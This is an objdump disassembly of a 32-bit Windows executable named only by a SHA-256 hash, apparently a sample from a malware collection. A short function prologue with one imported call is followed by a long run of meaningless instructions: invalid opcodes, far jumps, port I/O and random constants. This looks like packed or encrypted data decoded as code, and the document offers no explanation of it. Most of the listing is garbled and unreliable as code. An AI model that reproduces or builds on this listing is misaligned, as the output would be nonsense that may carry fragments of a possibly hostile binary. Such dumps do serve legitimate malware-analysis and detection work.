
f6e0d71712103453f024c07b1616b7eb3e5284386dd591fd269ef9728a234f27.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x70
  401006:	mov    DWORD PTR [ebp-0x48],0x0
  40100d:	mov    DWORD PTR [ebp-0x18],0x0
  401014:	mov    DWORD PTR [ebp-0x70],0x0
  40101b:	mov    DWORD PTR [ebp-0x60],0x0
  401022:	mov    DWORD PTR [ebp-0x8],0x0
  401029:	mov    DWORD PTR [ebp-0x6c],0x0
  401030:	mov    DWORD PTR [ebp-0x68],0x0
  401037:	mov    DWORD PTR [ebp-0x14],0x0
  40103e:	mov    DWORD PTR [ebp-0x4c],0x0
  401045:	mov    DWORD PTR [ebp-0x10],0x0
  40104c:	mov    DWORD PTR [ebp-0x58],0x0
  401053:	mov    DWORD PTR [ebp-0x4],0x0
  40105a:	mov    DWORD PTR [ebp-0x5c],0x0
  401061:	mov    DWORD PTR [ebp-0x30],0x0
  401068:	mov    DWORD PTR [ebp-0x54],0x0
  40106f:	mov    DWORD PTR [ebp-0x2c],0x0
  401076:	mov    DWORD PTR [ebp-0x50],0x0
  40107d:	mov    DWORD PTR [ebp-0xc],0x0
  401084:	mov    eax,ds:0x448fa8
  401089:	mov    DWORD PTR [ebp-0x28],eax
  40108c:	mov    ecx,DWORD PTR ds:0x448fac
  401092:	mov    DWORD PTR [ebp-0x24],ecx
  401095:	mov    edx,DWORD PTR ds:0x448fb0
  40109b:	mov    DWORD PTR [ebp-0x20],edx
  40109e:	mov    al,ds:0x448fb4
  4010a3:	mov    BYTE PTR [ebp-0x1c],al
  4010a6:	mov    ecx,DWORD PTR ds:0x448fb8
  4010ac:	mov    DWORD PTR [ebp-0x40],ecx
  4010af:	mov    edx,DWORD PTR ds:0x448fbc
  4010b5:	mov    DWORD PTR [ebp-0x3c],edx
  4010b8:	mov    eax,ds:0x448fc0
  4010bd:	mov    DWORD PTR [ebp-0x38],eax
  4010c0:	mov    cx,WORD PTR ds:0x448fc4
  4010c7:	mov    WORD PTR [ebp-0x34],cx
  4010cb:	mov    dl,BYTE PTR ds:0x448fc6
  4010d1:	mov    BYTE PTR [ebp-0x32],dl
  4010d4:	mov    DWORD PTR [ebp-0x30],0x40
  4010db:	lea    eax,[ebp-0x40]
  4010de:	push   eax
  4010df:	lea    ecx,[ebp-0x10]
  4010e2:	push   ecx
  4010e3:	call   DWORD PTR ds:0x417000
  4010e9:	test   eax,eax
  4010eb:	je     0x4152d6
  4010f1:	mov    edx,DWORD PTR [ebp-0x10]
  4010f4:	add    edx,0x1
  4010f7:	mov    DWORD PTR [ebp-0x10],edx
  4010fa:	ret    0xa4d
  4010fd:	(bad)  
  4010ff:	aaa    
  401100:	xor    BYTE PTR ds:0xb43181db,dh
  401106:	popa   
  401107:	push   edi
  401108:	jmp    0x6bc605f4
  40110d:	inc    eax
  40110e:	imul   ecx,DWORD PTR [ebx+0x41],0xffffffe2
  401112:	and    BYTE PTR [ebx+0x74],0xb9
  401116:	pop    ebx
  401117:	jmp    0x34d3:0xcad96c2c
  40111e:	inc    edi
  40111f:	stc    
  401120:	arpl   cx,bx
  401122:	imul   ebp,DWORD PTR [ebx],0xffffffa3
  401125:	stc    
  401126:	repz imul eax,DWORD PTR [edi],0xfffffff5
  40112a:	into   
  40112b:	ficom  DWORD PTR [ebx]
  40112d:	dec    edx
  40112e:	inc    edx
  40112f:	pop    esp
  401130:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401131:	lea    esp,[edx]
  401133:	mul    DWORD PTR [esi+0x38544a78]
  401139:	mov    ch,0x2d
  40113b:	fild   WORD PTR [edx]
  40113d:	xor    bl,dl
  40113f:	mov    ecx,0x9661f5ab
  401144:	inc    ecx
  401145:	sahf   
  401146:	fadd   DWORD PTR [esi]
  401148:	call   0xe26f:0xf4cbd263
  40114f:	dec    ecx
  401150:	xchg   ecx,eax
  401151:	jbe    0x4010f6
  401153:	mov    esi,0x789f9153
  401158:	jp     0x401187
  40115a:	shl    BYTE PTR [ecx-0x2b],cl
  40115d:	pushf  
  40115e:	sahf   
  40115f:	mov    dl,0x68
  401161:	pusha  
  401162:	adc    BYTE PTR [ebx-0x5c70313c],0xe2
  401169:	add    cl,BYTE PTR [edi]
  40116b:	mov    ch,0xc5
  40116d:	mov    eax,ds:0x8721623f
  401172:	ins    BYTE PTR es:[edi],dx
  401173:	jb     0x401151
  401175:	push   ecx
  401176:	jb     0x401142
  401178:	pop    esp
  401179:	scas   eax,DWORD PTR es:[edi]
  40117a:	push   ebp
  40117b:	loopne 0x4011a3
  40117d:	in     eax,dx
  40117e:	loop   0x401132
  401180:	adc    edx,DWORD PTR [ebx]
  401182:	lahf   
  401183:	fistp  DWORD PTR [edi-0x5a]
  401186:	mov    ebp,0xbc2d0e1
  40118b:	shl    BYTE PTR [edx-0x292b1af5],1
  401191:	shl    DWORD PTR [ebp+0x4576b1f4],0xb9
  401198:	imul   esi,DWORD PTR [ecx],0x484f6f4d
  40119e:	pop    es
  40119f:	cli    
  4011a0:	push   esi
  4011a1:	xchg   BYTE PTR [ebp-0x36ad74fc],ch
  4011a7:	xor    DWORD PTR [esi+eax*4],eax
  4011aa:	test   DWORD PTR [edx-0x5df96539],edi
  4011b0:	and    al,BYTE PTR [ebp+0x39ae2994]
  4011b6:	mov    edi,eax
  4011b8:	sbb    esp,DWORD PTR [ebx+0x4454431e]
  4011be:	mov    cl,BYTE PTR [ebx]
  4011c0:	push   ss
  4011c1:	mov    DWORD PTR ds:0x3a7f5f52,edx
  4011c7:	mov    ds:0xd21d74dd,eax
  4011cc:	ins    DWORD PTR es:[edi],dx
  4011cd:	pop    esi
  4011ce:	push   ebx
  4011cf:	pop    ds
  4011d0:	fidivr WORD PTR [edx]
  4011d2:	dec    ecx
  4011d3:	lds    esi,FWORD PTR [ebp+0x6e]
  4011d6:	inc    ebp
  4011d7:	out    0x8e,al
  4011d9:	xchg   esp,eax
  4011da:	imul   ecx,DWORD PTR [ecx+0x65b3be12],0x3dd17315
  4011e4:	mov    dh,0x8c
  4011e6:	xchg   edx,eax
  4011e7:	data16 lods al,BYTE PTR ds:[esi]
  4011e9:	xor    eax,0xf6e75a20
  4011ee:	dec    ecx
  4011ef:	ds jp  0x4011fe
  4011f2:	in     al,0xa2
  4011f4:	scas   al,BYTE PTR es:[edi]
  4011f5:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  4011f7:	inc    ecx
  4011f8:	dec    ecx
  4011f9:	test   al,0x1d
  4011fb:	das    
  4011fc:	xlat   BYTE PTR ds:[ebx]
  4011fd:	mov    esp,0x28d8d7a9
  401202:	cmp    eax,0x52610bb
  401207:	xor    BYTE PTR [edx-0x69],0x53
  40120b:	imul   eax,DWORD PTR [ebp+0x76],0x288ce8c3
  401212:	in     al,0x7d
  401214:	sbb    DWORD PTR [edx+0x50e91f0c],esi
  40121a:	pop    ebp
  40121b:	shl    DWORD PTR es:[esi],0x93
  40121f:	adc    eax,ebx
  401221:	jl     0x401212
  401223:	xor    bh,BYTE PTR [ecx+0x15]
  401226:	jne    0x4011c7
  401228:	xor    eax,edi
  40122a:	les    edi,FWORD PTR [ebx+eiz*1]
  40122d:	jae    0x40120b
  40122f:	pushf  
  401230:	xchg   ebp,eax
  401231:	lds    ecx,FWORD PTR [ebx-0x3a]
  401234:	stc    
  401235:	pop    edx
  401236:	push   ss
  401237:	cli    
  401238:	dec    ebx
  401239:	push   0xf5f83906
  40123e:	lds    eax,FWORD PTR [esi]
  401240:	mov    ds:0x20bae5a8,al
  401245:	div    BYTE PTR [ebx-0x78]
  401248:	push   es
  401249:	inc    esp
  40124a:	repz or DWORD PTR [eax+0x75],ecx
  40124e:	push   eax
  40124f:	sbb    edi,DWORD PTR [ecx+0x12ddcfe]
  401255:	aam    0x24
  401257:	cwde   
  401258:	adc    al,cl
  40125a:	pushf  
  40125b:	dec    esi
  40125c:	ins    BYTE PTR es:[edi],dx
  40125d:	mov    ds:0x91575a1f,al
  401262:	in     eax,0xc7
  401264:	mov    fs,ecx
  401266:	sub    ah,BYTE PTR [edx]
  401268:	das    
  401269:	adc    eax,0xd93c11b8
  40126e:	std    
  40126f:	das    
  401270:	scas   eax,DWORD PTR es:[edi]
  401271:	xchg   DWORD PTR [esi],edx
  401273:	fwait
  401274:	dec    ebp
  401275:	inc    esp
  401276:	or     DWORD PTR [edi],esp
  401278:	stos   BYTE PTR es:[edi],al
  401279:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40127a:	call   FWORD PTR [ebp+0x19]
  40127d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40127e:	mov    al,ds:0x71385419
  401283:	imul   ebp,eax,0xffffffb2
  401286:	or     bh,cl
  401288:	push   ds
  401289:	shr    ebp,1
  40128b:	addr16 inc edi
  40128d:	gs mov cl,0x8c
  401290:	xlat   BYTE PTR ds:[ebx]
  401291:	xor    bh,BYTE PTR [ebp+0x7698c578]
  401297:	pop    esp
  401298:	in     eax,0x8c
  40129a:	cmp    esi,DWORD PTR [esi+esi*1-0xdc2a13b]
  4012a1:	leave  
  4012a2:	cs data16 sub cl,ah
  4012a6:	pop    esp
  4012a7:	adc    eax,0x146dc855
  4012ac:	or     al,0xa4
  4012ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4012af:	clc    
  4012b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4012b1:	sbb    eax,0x541f42e6
  4012b6:	jmp    0x401262
  4012b8:	fstp   TBYTE PTR [esi-0x1bb135e7]
  4012be:	push   esp
  4012bf:	push   ebx
  4012c0:	lahf   
  4012c1:	jg     0x4012c8
  4012c3:	repz inc ebx
  4012c5:	mov    eax,0xcca923a7
  4012ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4012cb:	popa   
  4012cc:	out    dx,al
  4012cd:	lock xor esp,DWORD PTR [ebx-0x13]
  4012d1:	xchg   ecx,eax
  4012d2:	ds push ds
  4012d4:	je     0x4012a5
  4012d6:	cmp    eax,0x86065b4
  4012db:	add    al,0xad
  4012dd:	bound  edi,QWORD PTR [ebp+0x39a12631]
  4012e3:	add    al,0xae
  4012e5:	dec    eax
  4012e6:	sbb    al,0x18
  4012e8:	cmp    BYTE PTR [ebx],ah
  4012ea:	out    0xd5,al
  4012ec:	jge    0x4012a7
  4012ee:	aaa    
  4012ef:	call   0xfe46:0x885d7ad0
  4012f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4012f7:	aad    0xd3
  4012f9:	mov    esi,0xd551a3ab
  4012fe:	lock mov dl,BYTE PTR [eax]
  401301:	adc    ebx,esi
  401303:	mov    edx,DWORD PTR [ebx+0x1e1dd668]
  401309:	fcmovnbe st,st(0)
  40130b:	jl     0x401300
  40130d:	loope  0x40133b
  40130f:	and    cl,bh
  401311:	cli    
  401312:	test   DWORD PTR [edi+0x50],ebp
  401315:	adc    DWORD PTR [edx-0x1cc3fac0],ebx
  40131b:	das    
  40131c:	cli    
  40131d:	int3   
  40131e:	fcmovne st,st(3)
  401320:	in     al,0x12
  401322:	sbb    DWORD PTR [edi],edx
  401324:	adc    DWORD PTR [edi+0x3bda6006],0x5cdeaf6d
  40132e:	and    bh,BYTE PTR [ebx+0x15d20820]
  401334:	or     al,0x9
  401336:	add    cl,0xab
  401339:	sub    al,0x63
  40133b:	mov    bh,0x4
  40133d:	je     0x401367
  40133f:	dec    ebp
  401340:	retf   
  401341:	dec    esp
  401342:	xchg   esp,eax
  401343:	call   0x49f2e856
  401348:	xor    eax,0x86ffb83b
  40134d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40134e:	call   0xc72120bb
  401353:	outs   dx,BYTE PTR ds:[esi]
  401354:	and    al,0xdf
  401356:	repz test cl,al
  401359:	pop    esi
  40135a:	mov    esp,DWORD PTR [eax]
  40135c:	mov    ch,BYTE PTR [ebp-0x7c]
  40135f:	dec    edx
  401360:	aas    
  401361:	aaa    
  401362:	aad    0xd3
  401364:	call   0xdfbfb32c
  401369:	push   es
  40136a:	mov    dh,0x3f
  40136c:	cld    
  40136d:	pop    ecx
  40136e:	pop    ebp
  40136f:	shl    BYTE PTR [edx-0x7f],cl
  401372:	out    dx,eax
  401373:	xchg   BYTE PTR [eax-0x77],ah
  401376:	dec    esi
  401377:	xor    DWORD PTR [edi-0xe],edi
  40137a:	dec    ebp
  40137b:	xchg   edi,eax
  40137c:	js     0x40131b
  40137e:	cmp    ebp,DWORD PTR [ebx-0x7e]
  401381:	sub    DWORD PTR [ecx+0x18200057],0xffffff8b
  401388:	cmp    al,0x97
  40138a:	pop    edi
  40138b:	pop    eax
  40138c:	mov    BYTE PTR [ecx+edx*8-0x39],ah
  401390:	jp     0x401387
  401392:	pop    eax
  401393:	(bad)  
  401395:	pop    ebp
  401396:	inc    esi
  401397:	pushf  
  401398:	in     al,0xc2
  40139a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40139b:	inc    eax
  40139c:	jmp    0xc9d7:0xf061d283
  4013a3:	sub    dl,BYTE PTR [esi-0x33]
  4013a6:	pop    ss
  4013a7:	or     cl,al
  4013a9:	cdq    
  4013aa:	outs   dx,DWORD PTR ds:[esi]
  4013ab:	jno    0x401381
  4013ad:	sar    DWORD PTR [edi-0x4a91ceb4],1
  4013b3:	test   al,0x70
  4013b5:	imul   DWORD PTR [edx+0x42155f2]
  4013bb:	stos   BYTE PTR es:[edi],al
  4013bc:	lods   al,BYTE PTR ds:[esi]
  4013bd:	inc    eax
  4013be:	ins    BYTE PTR es:[edi],dx
  4013bf:	sub    al,0x66
  4013c1:	nop
  4013c2:	cmp    edi,DWORD PTR [edx-0x11879efe]
  4013c8:	cli    
  4013c9:	popa   
  4013ca:	imul   esi,DWORD PTR [ebx],0xb804361b
  4013d0:	aas    
  4013d1:	add    dl,BYTE PTR ds:0xa1abde37
  4013d7:	addr16 int 0x9f
  4013da:	push   ebp
  4013db:	jnp    0x401423
  4013dd:	adc    BYTE PTR [eax+ecx*8-0x3edf9125],0xef
  4013e5:	retf   
  4013e6:	mov    fs,WORD PTR [eax]
  4013e8:	lods   al,BYTE PTR ds:[esi]
  4013e9:	test   eax,0xa752032f
  4013ee:	les    ebx,FWORD PTR [edi]
  4013f0:	mov    eax,0xeb0d7290
  4013f5:	nop
  4013f6:	clc    
  4013f7:	mov    eax,ds:0x2612896
  4013fc:	loopne 0x4013df
  4013fe:	dec    edx
  4013ff:	adc    al,dl
  401401:	aaa    
  401402:	xchg   edi,eax
  401403:	fwait
  401404:	push   edx
  401405:	push   ebp
  401406:	adc    DWORD PTR [ebp+0x4bb69e48],0x23
  40140d:	xor    ecx,DWORD PTR [esi+0x49a8be22]
  401413:	or     al,BYTE PTR [edx]
  401415:	in     al,0xa5
  401417:	sbb    ecx,DWORD PTR [esp+ebp*2+0x4ee9c33b]
  40141e:	xchg   esp,eax
  40141f:	fisttp WORD PTR [eax+0xaedbe0]
  401425:	sub    DWORD PTR [ebx+0x250bbcf4],eax
  40142b:	jle    0x401460
  40142d:	call   0xbe8f1193
  401432:	int3   
  401433:	fimul  WORD PTR [eax+0x6d]
  401436:	pop    ebp
  401437:	xor    eax,0x5cbc26e8
  40143c:	push   ebp
  40143d:	sbb    DWORD PTR [ebx],edx
  40143f:	(bad)  
  401440:	sar    DWORD PTR [eax+edi*2-0x3474fd6d],cl
  401447:	dec    ecx
  401448:	stos   BYTE PTR es:[edi],al
  401449:	jmp    0x595dcea1
  40144e:	mov    al,0x1a
  401450:	pusha  
  401451:	adc    eax,0x61adfeec
  401456:	and    edx,ebp
  401458:	imul   ecx,DWORD PTR [ecx],0xd0faf2be
  40145e:	jnp    0x401425
  401460:	xchg   ebp,eax
  401461:	test   eax,0x7537850e
  401466:	or     ecx,DWORD PTR [ecx]
  401468:	jmp    0xad:0xebbbc169
  40146f:	and    BYTE PTR [edx-0x7aae7a73],0x1b
  401476:	mov    eax,0x8b79ffe8
  40147b:	pushf  
  40147c:	mov    dh,0x18
  40147e:	xor    BYTE PTR [eax-0x533e89af],cl
  401484:	and    eax,0x9a38abc8
  401489:	cli    
  40148a:	pop    edx
  40148b:	(bad)  
  40148c:	aad    0x71
  40148e:	push   ebx
  40148f:	scas   eax,DWORD PTR es:[edi]
  401490:	xchg   edi,eax
  401491:	add    bh,BYTE PTR [edx]
  401493:	jge    0x4014b3
  401495:	out    dx,eax
  401496:	dec    edx
  401497:	cmc    
  401498:	jl     0x40146a
  40149a:	cwde   
  40149b:	pop    ecx
  40149c:	data16 mov WORD PTR [edi+0x796a20c1],fs
  4014a3:	dec    ebp
  4014a4:	int    0x44
  4014a6:	scas   eax,DWORD PTR es:[edi]
  4014a7:	jns    0x4014d7
  4014a9:	inc    ecx
  4014aa:	pop    ebp
  4014ab:	cld    
  4014ac:	fsubr  QWORD PTR [edi+0x4bd40026]
  4014b2:	outs   dx,DWORD PTR ds:[esi]
  4014b3:	xchg   esp,eax
  4014b4:	mov    eax,ds:0x5e13a35b
  4014b9:	aas    
  4014ba:	push   0x45
  4014bc:	sti    
  4014bd:	sub    BYTE PTR [edi-0x5e],0x5c
  4014c1:	les    esp,FWORD PTR [edx+0xa0dc847]
  4014c7:	dec    edx
  4014c8:	pop    ebp
  4014c9:	xor    al,0xfc
  4014cb:	pop    ds
  4014cc:	ret    0xcb71
  4014cf:	call   0x83087a2d
  4014d4:	push   edx
  4014d5:	ja     0x4014d0
  4014d7:	dec    esi
  4014d8:	cli    
  4014d9:	and    BYTE PTR ds:0xa78bd8c9,ah
  4014df:	out    0x60,eax
  4014e1:	(bad)  
  4014e3:	push   edx
  4014e4:	jmp    0xeece:0xafd5bd03
  4014eb:	ds dec ebp
  4014ed:	es ret 0xe0ff
  4014f1:	daa    
  4014f2:	or     DWORD PTR [ecx],edx
  4014f4:	hlt    
  4014f5:	mov    ebx,0x43f5e2db
  4014fa:	cdq    
  4014fb:	inc    esp
  4014fc:	adc    dl,al
  4014fe:	and    eax,0x76896a9b
  401503:	jbe    0x401493
  401505:	push   edi
  401506:	inc    ebp
  401507:	das    
  401508:	mov    al,ds:0x79bccbcc
  40150d:	in     al,0x24
  40150f:	lock mov ds:0x7149202c,eax
  401515:	cwde   
  401516:	sbb    eax,DWORD PTR [ecx+esi*2-0x42]
  40151a:	xor    esi,ebx
  40151c:	mov    DWORD PTR [esi+0x27],0xacdb9096
  401523:	sub    eax,DWORD PTR [edi+0x6a]
  401526:	push   esi
  401527:	imul   edx,DWORD PTR [esi],0x794d174a
  40152d:	push   esp
  40152e:	loopne 0x4014bb
  401530:	sub    eax,DWORD PTR [ebp-0x403abeed]
  401536:	jae    0x40155a
  401538:	push   edi
  401539:	icebp  
  40153a:	jecxz  0x401580
  40153c:	add    al,0x4f
  40153e:	jnp    0x4014d6
  401540:	retf   0x202e
  401543:	xor    DWORD PTR [esi],esi
  401545:	fdiv   DWORD PTR [edi-0x936b544]
  40154b:	push   ecx
  40154c:	retf   
  40154d:	mov    esp,0x644edee7
  401552:	mov    eax,ds:0x32a5bfb2
  401557:	imul   esi,DWORD PTR [ebx],0x66e2c73d
  40155d:	mov    WORD PTR [ebp+eiz*4-0x1e],gs
  401561:	cdq    
  401562:	xor    al,0x47
  401564:	enter  0xc1e5,0x3c
  401568:	aad    0x28
  40156a:	mov    ch,0x47
  40156c:	push   eax
  40156d:	push   ebp
  40156e:	dec    esp
  40156f:	xchg   ebx,eax
  401570:	jbe    0x4015c0
  401572:	ret    
  401573:	ror    BYTE PTR [edx-0xb],0x12
  401577:	sbb    al,0x5c
  401579:	sbb    DWORD PTR [eax],0x5ddf08c1
  40157f:	aaa    
  401580:	sbb    BYTE PTR [edx-0x41],ah
  401583:	jmp    0x401559
  401585:	mov    bh,0x68
  401587:	int3   
  401588:	lods   al,BYTE PTR ds:[esi]
  401589:	scas   eax,DWORD PTR es:[edi]
  40158a:	in     eax,0xa2
  40158c:	mov    cl,0xb
  40158e:	mov    edi,0x28fba4ab
  401593:	inc    eax
  401594:	jae    0x40153c
  401596:	pop    edi
  401598:	imul   ebp,DWORD PTR [ebx-0x42754231],0x693cf32a
  4015a2:	add    DWORD PTR [ebp-0x255e64b4],0x64e55db
  4015ac:	xchg   esp,eax
  4015ad:	je     0x40156e
  4015af:	push   esp
  4015b0:	js     0x401550
  4015b2:	cdq    
  4015b3:	xor    ebp,DWORD PTR [ebx]
  4015b5:	or     eax,0xf455b5bb
  4015ba:	push   esp
  4015bb:	mov    esi,0x9c4a4669
  4015c0:	sbb    DWORD PTR [edx+ecx*1-0xe26ed76],eax
  4015c7:	inc    ebx
  4015c8:	add    eax,0x8cac54ae
  4015cd:	cmp    DWORD PTR fs:[ebx-0xa42255f],eax
  4015d4:	mov    esp,0x17ee97dd
  4015d9:	cdq    
  4015da:	test   DWORD PTR [ecx+0x2510fcbd],eax
  4015e0:	xor    al,0x2a
  4015e2:	jno    0x4015a4
  4015e4:	xchg   edx,eax
  4015e5:	pop    es
  4015e6:	fisubr WORD PTR ds:0x6d69c14d
  4015ec:	sub    eax,0xaea96311
  4015f1:	test   DWORD PTR [edi-0x790c1e2d],edx
  4015f7:	(bad)  
  4015f8:	in     al,dx
  4015f9:	imul   ebx,DWORD PTR ds:0x624c5ee5,0xffffff9b
  401600:	pop    esi
  401601:	push   0xffffff83
  401603:	mov    eax,ds:0x5543c693
  401608:	lock inc edi
  40160a:	and    ch,BYTE PTR [ebx+ecx*2+0x2e]
  40160e:	lea    esp,[ebp-0x42]
  401611:	fiadd  DWORD PTR [edi]
  401613:	lea    esi,[edx]
  401615:	call   0xf3a5:0xe4f6103e
  40161c:	outs   dx,DWORD PTR ds:[esi]
  40161d:	(bad)  
  40161f:	mov    esp,0xd79465ec
  401624:	push   0xffffffae
  401626:	push   esp
  401627:	out    dx,eax
  401628:	push   esi
  401629:	(bad)  
  40162b:	les    edi,FWORD PTR [eax+0x5d]
  40162e:	repz test al,0x16
  401631:	call   0x63178401
  401636:	out    dx,eax
  401637:	ss mov esp,0xc232ad09
  40163d:	rcr    esi,cl
  40163f:	aaa    
  401640:	xor    al,0x61
  401642:	repz gs test eax,0xb52c292a
  401649:	retf   0x8f1d
  40164c:	push   ecx
  40164d:	addr16 enter 0xe20b,0x2f
  401652:	or     eax,0x9448fc2
  401657:	push   ds
  401658:	mov    edi,0x6953796b
  40165d:	retf   
  40165e:	neg    BYTE PTR [edi+edi*1]
  401661:	stos   BYTE PTR es:[edi],al
  401662:	sbb    bl,bh
  401664:	sti    
  401665:	fwait
  401666:	mov    bl,0x3c
  401668:	sbb    dl,BYTE PTR [eax+esi*8]
  40166b:	sbb    eax,DWORD PTR [esi+0x1a5074a3]
  401671:	mov    eax,0x58a7b95a
  401676:	cwde   
  401677:	push   ecx
  401678:	xor    BYTE PTR [esi-0x78],dh
  40167b:	shl    DWORD PTR [ecx+0x38],1
  40167e:	cmp    eax,0xc6fff90d
  401683:	pop    esi
  401684:	xchg   DWORD PTR [edx-0x4e598484],ebx
  40168a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40168b:	adc    bl,bh
  40168d:	jmp    0x4488:0x5d911d07
  401694:	adc    ah,BYTE PTR [edi+0x36]
  401697:	inc    esp
  401698:	aam    0xf1
  40169a:	sbb    edi,DWORD PTR ds:[eax+0x1c]
  40169e:	cmp    dl,BYTE PTR [eax]
  4016a0:	adc    eax,0x41b2b111
  4016a5:	pop    eax
  4016a6:	sbb    DWORD PTR [ebx+0xe4b6cdc],ebx
  4016ac:	mov    edi,DWORD PTR [ecx+ebx*2+0x7d]
  4016b0:	in     eax,0xe1
  4016b2:	sahf   
  4016b3:	pop    ecx
  4016b4:	adc    bl,0xdd
  4016b7:	(bad)
  4016bb:	in     eax,dx
  4016bc:	or     BYTE PTR [ecx],cl
  4016be:	call   FWORD PTR [esi+ebp*8]
  4016c1:	test   al,0x5f
  4016c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4016c4:	cmp    BYTE PTR [ecx+eax*4+0x975cb83],0xf0
  4016cc:	call   0xf7f2:0x5643ae2f
  4016d3:	test   eax,0xbd3a9e14
  4016d8:	pop    es
  4016d9:	sub    esi,DWORD PTR [esi+0x35]
  4016dc:	fimul  WORD PTR [esi]
  4016de:	loope  0x401757
  4016e0:	cmp    eax,DWORD PTR fs:[esi+ebx*4+0x69]
  4016e5:	push   ebp
  4016e6:	lds    edi,FWORD PTR [ecx-0x62]
  4016e9:	and    ecx,DWORD PTR [ebx+esi*8-0x133bbf1f]
  4016f0:	inc    ebp
  4016f1:	(bad)  
  4016f3:	cmp    BYTE PTR [edx-0x320cd184],0x88
  4016fa:	mov    eax,0xce636315
  4016ff:	int3   
  401700:	sub    eax,0x3b1fe625
  401705:	and    ecx,DWORD PTR [edi-0x1410b90c]
  40170b:	(bad)  
  40170c:	and    DWORD PTR [ebp+0xd],esp
  40170f:	add    esp,ebx
  401711:	int    0x8c
  401713:	mov    ah,0x34
  401715:	loopne 0x40172f
  401717:	out    dx,eax
  401718:	hlt    
  401719:	les    ebp,FWORD PTR [ecx+ecx*2]
  40171c:	shr    BYTE PTR [ecx-0x45c3ca7],cl
  401722:	mov    dl,0x3c
  401724:	add    bh,BYTE PTR [ebp+0x1bd23fdd]
  40172a:	pop    ss
  40172b:	jmp    0xd3c1:0x36cbfac0
  401732:	mov    eax,ds:0x19387bd6
  401737:	mov    esp,DWORD PTR [ebx+0x2e]
  40173a:	retf   
  40173b:	loope  0x4016f5
  40173d:	jns    0x401764
  40173f:	frstor [ecx-0xa]
  401742:	sbb    BYTE PTR [ebp+0x3294c25f],dh
  401748:	or     eax,edi
  40174a:	sbb    bh,BYTE PTR [edx-0x133e4c55]
  401750:	push   0xffffff97
  401752:	shr    DWORD PTR [ecx-0x4b],0x6d
  401756:	jo     0x4017d2
  401758:	enter  0xe984,0x5c
  40175c:	enter  0x655d,0xfc
  401760:	mov    al,0xb7
  401762:	push   esi
  401763:	dec    ebx
  401764:	retf   
  401765:	ja     0x4017b9
  401767:	stos   DWORD PTR es:[edi],eax
  401768:	xlat   BYTE PTR ds:[ebx]
  401769:	sub    BYTE PTR [eax],ah
  40176b:	cmp    al,0x43
  40176d:	xor    BYTE PTR [edx+0x39171fee],bh
  401773:	mov    ds:0x4f1662cf,al
  401778:	dec    ebp
  401779:	test   eax,0xd0cb7da4
  40177e:	push   eax
  40177f:	cmp    eax,0x7f4e262e
  401784:	imul   eax,DWORD PTR [esi+0x7b],0xfc9355cb
  40178b:	ret    
  40178c:	pop    edx
  40178d:	sbb    BYTE PTR [ecx],ah
  40178f:	jl     0x4017ad
  401791:	ins    DWORD PTR es:[edi],dx
  401792:	sahf   
  401793:	mov    DWORD PTR [ecx-0x72],edx
  401796:	cmp    BYTE PTR [esi+0x61133b76],al
  40179c:	xlat   BYTE PTR ds:[ebx]
  40179d:	iret   
  40179e:	push   eax
  40179f:	cdq    
  4017a0:	lahf   
  4017a1:	xchg   BYTE PTR [edx+0x474256c7],cl
  4017a7:	jae    0x4017fa
  4017a9:	fadd   st,st(3)
  4017ab:	mov    al,ds:0x6812aeff
  4017b0:	int3   
  4017b1:	ds jae 0x401782
  4017b4:	jecxz  0x40182f
  4017b6:	inc    edi
  4017b7:	je     0x401821
  4017b9:	daa    
  4017ba:	icebp  
  4017bb:	cli    
  4017bc:	addr16 jmp 0x4017dc
  4017bf:	add    DWORD PTR [ebx],ecx
  4017c1:	bound  esi,QWORD PTR [edi]
  4017c3:	mov    ss,ebp
  4017c5:	mov    esi,0x18efb8d6
  4017ca:	xchg   edi,eax
  4017cb:	in     eax,0x22
  4017cd:	sub    ah,BYTE PTR [edx+0x11]
  4017d0:	seto   BYTE PTR ds:0x340a621c
  4017d7:	adc    eax,0x85ecdde2
  4017dc:	hlt    
  4017dd:	ja     0x401833
  4017df:	xchg   ecx,eax
  4017e0:	push   eax
  4017e1:	test   DWORD PTR [edi-0x44aa8e0b],edi
  4017e7:	pop    ss
  4017e8:	sub    ebx,DWORD PTR [eax]
  4017ea:	je     0x4017cf
  4017ec:	pushf  
  4017ed:	add    eax,DWORD PTR ds:0x25e27d76
  4017f3:	jnp    0x4017e7
  4017f5:	pop    edx
  4017f6:	mov    esi,0x8cc887e0
  4017fb:	inc    ebp
  4017fc:	or     ch,BYTE PTR ds:0x356df74d
  401802:	fcomp  DWORD PTR [ebp-0x61]
  401805:	xchg   ecx,eax
  401806:	pop    eax
  401807:	sub    eax,0x5314b4af
  40180c:	mov    DWORD PTR [ebx+ebx*4-0x5b4d890b],eax
  401813:	ins    BYTE PTR es:[edi],dx
  401814:	push   ss
  401815:	aaa    
  401816:	dec    eax
  401817:	or     eax,0x8ea30cfc
  40181c:	and    cl,BYTE PTR [ecx]
  40181e:	pop    edx
  40181f:	push   edi
  401820:	xor    eax,DWORD PTR [ecx+0x582cd0e]
  401826:	sahf   
  401827:	(bad)  [ebx]
  401829:	lods   eax,DWORD PTR ds:[esi]
  40182a:	mov    BYTE PTR [edi-0x5c72e2c0],bl
  401830:	or     al,0xa4
  401832:	fwait
  401833:	and    eax,DWORD PTR ds:0xf46c9d56
  401839:	or     DWORD PTR [eax],0xffffffa8
  40183c:	sbb    eax,0xfc47c9e2
  401841:	pop    ds
  401842:	jmp    0x1fb01844
  401847:	fcomi  st,st(6)
  401849:	cmp    al,0x68
  40184b:	push   cs
  40184c:	int3   
  40184d:	call   0x447236e9
  401852:	fiadd  DWORD PTR [ebp+0x40]
  401855:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401856:	mov    eax,ds:0x88b3613a
  40185b:	call   0x4e374e1c
